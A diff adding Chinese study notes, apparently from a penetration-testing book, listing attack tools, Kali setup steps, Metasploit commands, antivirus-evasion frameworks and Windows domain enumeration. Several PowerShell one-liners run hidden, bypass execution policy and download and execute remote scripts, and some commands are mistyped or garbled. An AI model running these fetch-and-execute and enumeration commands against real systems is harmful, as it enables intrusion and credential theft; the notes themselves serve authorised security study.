@@ -1,1 +1,243 @@
+心脏出血
+shellshock
+kerberos问题(金票据/万能钥匙)
+postgres数据的哈希传递攻击
+新型网络钓鱼攻击
+性价比高的渗透便携设备
+快速智能密码破解
+新型wifi攻击
+大量powershell脚本
+提升权限攻击
+大规模网络突破
+横向渗透
+burp模块
+打印机漏洞利用
+后门工厂
+zap代理
+粘滞键攻击
+nosql注入
+商业工具(cobalt strike,canvas ,core impact)
+橡皮鸭子(usb接口物理渗透工具)
+proxmarks(rfid破解工具)
+smbexec psexec
+powertools mimikatz工具
+psexec_ntdsgrab
+------------------------------------------------------
+商业软件
+burp suite pro
+canvas
+cobalt strike
+core impact
+nessus
+nexpose
+kali linux 
+backbox
+
+扫描工具:
+discover
+eyewitness
+httpscreenshot
+wmap
+spiderfoot
+masscan
+gitrob
+cmsmap
+recon-ng
+sparta
+wpscan
+password lists
+漏洞利用工具：
+burpsuite pro
+zap proxypro
+nosqlmap
+sqlmap
+sql ninja
+beff
+responder
+printer exploits
+veil
+wifiphisher
+wifite
+SET
+后渗透测试：
+本书自定义脚本
+smbexec
+veil
+wce
+mimikatz
+powersploit
+后门制造工厂
+dshashes
+net-creds
+--------------------------------------------------------
+kali 
+  apt update
+  apt dist-upgrade
+  service postgresql start
+  update-rc.d postgresql enable
+  service metasploit start
+  service metasploit stop
+  apt install gedit
+  gedit /etc/hostname
+  gedit /etc/hosts
+  reboot
+-----------------------------------------------------------
+工具安装
+后门制造工厂
+    对pe，elf，mach-o二进制文件注入shellcode
+    the-backdoor-factory
+httpscreenshot
+smbexec
+    使用samba工具的一种快速psexec类型攻击
+
+printer exploits:
+    包含大量常用打印机漏洞的利用工具
+discover script：
+     定制的bash脚本，自动化处理各种渗透任务
+responder：
+      一个攻击工具，包括http,smb,mssql,ftp,ldap等方法
+
+包含powersploit 和powertools的代码
+nishang
+
+dshashes:
+    从ntdsxtract中提取用户哈希值
+  
+sparta
+nosqlmap
+spiderfoot
+
+pip isntall lxml
+pip install netaddr
+wce
+mimikatz
+set
+nishang
+powersploit
+
+veil-framework
+红队工具用于规避杀毒软件检测，目前veil-evasion用于生成规避杀毒软件净荷，veil-catapult投递到目标，veil-powerview获取windows域网络,veil框架也有创建基于python脚本的meterpreter可执行程序
+
+fuzzing list(seclists)
+字典密码
+
+net-creds网络分析
+分析pcap文件，获取用户名/密码
+
+安装firefox插件
+    web开发人员插件  tamperdata proxy userganet
+wifite  wifi网络攻击工具
+wifiphisher  wifi网络自动化钓鱼
+
+phishing
+--------------------------------------------------------------------------------
+windows 虚拟机工具
+  cain and abel
+  HxD  十六进制编辑器
+  evade  用于规避杀毒软件
+  hyperion  用于规避杀毒软件
+  metasploit
+  nexpose/nessus
+  nmap
+  oclhashcat
+  nishang
+  powersploit
+
+启动powershell渗透测试
+  windows7以上默认安装
+  powershell脚本可以运行在内存中
+  几乎不会出发杀毒软件
+  可以调用。net类
+  利用用户口令查询活动目录
+  远程执行powershell
+  使用windows脚本更加容易
+-exec bypass  绕过执行安全保护
+-nonI:非交互模式，powerhslel不提供用户的交互模式
+-noprofile(-NoP):powershell控制台不加载当前用户的配置
+-noexit:执行后不退出shell，这对脚本，例如键盘记录很方
+
+powerhslel.exe -nop -noni -w hidden -exec bypass
+
+下载
+powershell.exe -nop -noni -w hidden -exec bypass IEX(new-objectNet.webclient)downloadstring('poseerhslel url');                                   
+
+powershell.exe -nonpp;''''''',m     
+metasploit
+  权限提升，横向渗透  键盘记录 
+------------------------------------------------------------------------------------------------------------------
+第二章  扫描网络
+  开源情报收集(OSINT)
+  社交  LinkedIn twitter google+ facebook instagram myspace
+  recon-ng 
+
+  discover脚本(github.com/leebaird/discover)
+    dnsrecon goofile goog-mail goohost theharvester metasploit urlcrazy whois dnssy
+ sparta.py
+ nikto.pl
+ hydra
+ rapid7
+  nessus
+  openvas
+  zap webscarab nikto w3af
+
+第三章 漏洞利用
+  metasploit
+  search [string]
+  use module
+  info module
+  show options
+  set and setg
+  set PAYLOAD 
+  set EXE::Custom[file]
+  exploit -j 后台激活模块实现监听
+  sessions -K 关闭所有绘画
+  background  将meterpreter shell掉入主界面，保持当前绘画后台运行
+  运行资源文件.rc脚本自动化处理 msfconsole -r resour.rc
+
+  打印机漏洞（p91页）
+  praedasploit
+  http查看打印机 ，然后查看ldap服务器，
+
+  心脏滴血
+  shellshock
+  
+第四章，网站应用程序的人工检测技术
+  opendns
+
+第五章 横传-渗透内网（page 150页）
+    responder.py
+    john
+    hashcat
+
+    arp欺骗
+    ettercap
+
+  利用任意域凭证
+  windows枚举
+  whoami /all  && ipconfig /all && netstat -ano && net accounts && net localgroup administrators && net share
+
+  检查windows操作系统的补丁 powershell.exe -command get-hotfix
+  显示所有域用户和相关信息
+  powershell.exe -nop -noni -exec bypass iex(new-object net.webclient).downloadstring('powertools/master/powerview/powerview.ps1');get-netuser
+  powershell.exe -nop -noni -exec bypass iext(new-object net.webclient).downloadstring('powerview.ps1');getuserproperties -propertiest name,memberof,info
+  wmic useraccount get /all 
+  powershell.exe -command get-service  查看所有服务
+  powershell.exe -command restart-serivce
+  
+  powershell.exe -command get-process
+  wmic process get caption,execuatblepath,commandline
+
+  powershell.exe -nop -noni -exec bypass iex(new-object net.weclient)downloadstring("powerview.ps1");get-netcomputers
+
+ 后期思路 (p175)
+
+
+
+
+
+
+
+
+
+
 
